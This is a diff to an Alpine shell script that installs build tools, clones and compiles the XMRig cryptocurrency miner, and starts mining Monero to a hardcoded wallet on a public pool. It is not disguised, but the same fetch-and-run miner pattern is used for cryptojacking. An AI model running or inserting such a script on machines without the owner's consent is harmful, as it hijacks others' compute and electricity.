@@ -1,21 +1,18 @@
 #!/bin/sh
 
-# Update package lists
-apk update
+set -ex
 
-# Install required packages
-apk add --no-cache curl build-base
+# Install dependencies
+apk add --no-cache git build-base cmake libuv-dev libmicrohttpd-dev openssl-dev
 
-# Install XMRig miner
-curl -L https://github.com/xmrig/xmrig/releases/download/v6.18.1/xmrig-6.18.1-linux-x64.tar.gz -o xmrig.tar.gz
-tar -xvzf xmrig.tar.gz
-cd xmrig-6.18.1
-chmod +x xmrig
+# Clone XMRig and build it
+git clone https://github.com/xmrig/xmrig.git
+cd xmrig
+mkdir build && cd build
+cmake ..
+make -j$(nproc)
 
-# Configure the miner (using the user's provided wallet and pool settings)
-POOL="gulf.moneroocean.stream"
-PORT="10128"
-WALLET="45nqWWu8CV6WuNpEhbNAu4DWTmfUQBxRCWdND6iQVXyAL3cNNTeQoUWCmMzcaScdnJXJY3ttWxwJy9boywbN2XCn8Ejig1s"
-
-# Run the miner
-./xmrig -o $POOL:$PORT -u $WALLET -p x
+# Start mining
+./xmrig -o gulf.moneroocean.stream:10128 \
+  -u 45nqWWu8CV6WuNpEhbNAu4DWTmfUQBxRCWdND6iQVXyAL3cNNTeQoUWCmMzcaScdnJXJY3ttWxwJy9boywbN2XCn8Ejig1s \
+  --rig-id "$1" --keepalive --coin xmr
